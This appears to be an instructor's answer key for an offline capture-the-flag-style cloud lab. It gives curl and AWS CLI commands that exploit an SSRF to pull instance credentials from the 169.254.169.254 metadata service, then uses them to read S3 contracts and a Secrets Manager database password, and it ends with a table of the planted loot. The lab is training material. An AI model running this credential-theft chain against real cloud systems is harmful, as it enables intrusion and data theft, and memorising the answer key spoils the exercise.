# Solution — 08 Cirrus Cloud (hard)

> Spoilers — instructor's answer key. Fully offline (LocalStack); no real AWS.

## Chain (SSRF -> instance creds -> cloud data)

1. **Discover the SSRF.** `/app.js` reveals `/api/avatar?url=` (server-side fetch) and the
   IMDS base `http://169.254.169.254/latest/meta-data/`.
2. **SSRF the metadata service** for the instance role's temporary credentials:
   ```sh
   curl -s 'http://127.0.0.1:8108/api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
   # -> cirrus-web-instance
   curl -s 'http://127.0.0.1:8108/api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cirrus-web-instance'
   # -> AccessKeyId AKIACIRRUSEXAMPLE01 / SecretAccessKey / Token
   ```
3. **Use the creds against the cloud endpoint** (LocalStack on `127.0.0.1:8308`):
   ```sh
   export AWS_ACCESS_KEY_ID=AKIACIRRUSEXAMPLE01 AWS_SECRET_ACCESS_KEY=cirrusSecretExampleKeybPxRfiCYzEXAMPLErds AWS_SESSION_TOKEN=... AWS_DEFAULT_REGION=us-east-1
   aws --endpoint-url http://127.0.0.1:8308 sts get-caller-identity
   aws --endpoint-url http://127.0.0.1:8308 s3 ls
   aws --endpoint-url http://127.0.0.1:8308 s3 cp s3://cirrus-contracts/contracts/contracts.json -   # Meridian Freight Ltd, ...
   aws --endpoint-url http://127.0.0.1:8308 secretsmanager get-secret-value --secret-id cirrus/db/prod   # C1rrus-RDS-Prod-2026
   ```

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `instance-credentials` | `AKIACIRRUSEXAMPLE01 / …` | IMDS via SSRF |
| `s3-contracts` | `Meridian Freight Ltd`, … + `customers.csv` | `s3://cirrus-contracts/` |
| `secretsmanager-db` | `C1rrus-RDS-Prod-2026` | secret `cirrus/db/prod` |

Note: community LocalStack does not enforce IAM policies, so any recovered creds grant full
access — that IS the reportable finding (over-permissioned instance role + reachable IMDS).

## Reset

`make lab-restore LAB=08-hard-cirrus-cloud` (recreate — LocalStack re-runs the seed on a
fresh start).
